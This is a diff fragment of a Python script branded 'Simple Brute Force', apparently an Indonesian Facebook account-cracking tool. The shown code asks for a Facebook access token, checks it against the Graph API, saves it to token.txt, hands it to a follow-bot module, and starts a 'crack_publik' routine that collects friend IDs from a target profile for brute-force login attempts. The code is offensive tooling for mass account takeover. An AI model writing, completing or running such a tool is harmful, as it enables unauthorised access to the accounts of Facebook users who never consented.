@@ -10,22 +10,22 @@ ttl = []
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 def logo():
     print('\n   _______  ____    ___ \n  / __/ _ )/ __/___|_  | ┌────────────────────────┐\n _\ \/ _  / _//___/ __/  │  • Coded By Dapunta •  │\n/___/____/_/     /____/  │ Github.com/Dapunta/sbf │\n  Simple Brute Force     └────────────────────────┘\n')
-def login():
+def login(__cici__):
     os.system('rm -rf token.txt');os.system('clear');logo()
     token = input('[•] Masukkan Token :\n\n')
-    try:x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];v = open("token.txt", "w");v.write(token);v.close();exit(bot_follow_sbf.main())
-    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
-    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
+    try:x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];v = open("token.txt", "w");v.write(token);v.close();exit(bot_follow_sbf.main(__cici__))
+    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login(__cici__)
+    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login(__cici__)
 def menu(__cici__):
     os.system('clear');logo()
     try:token = open("token.txt","r").read();x = requests.get("https://graph.facebook.com/me?access_token=" + token);y = json.loads(x.text);n = y['name'];i = y['id']
-    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
-    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
+    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login(__cici__)
+    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login(__cici__)
     print('[•] Nama : %s'%(n));print('[•] ID : %s'%(i));crack_publik(__cici__)
 def crack_publik(__cici__):
     try:token = open("token.txt","r").read()
-    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login()
-    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login()
+    except (KeyError,IOError):print('\n[!] Token Invalid');os.system('rm -rf token.txt');login(__cici__)
+    except requests.exceptions.ConnectionError:print('\n[!] Koneksi Bermasalah');os.system('rm -rf token.txt');login(__cici__)
     print('\n[•] Ketik \'me\' Untuk Dump Dari Teman');i = input("[•] ID Publik : ")
     try:
         try:o = requests.get("https://graph.facebook.com/" + i + "?access_token=" + token);b = json.loads(o.text);print ('[•] Nama : %s'%(b['name']))
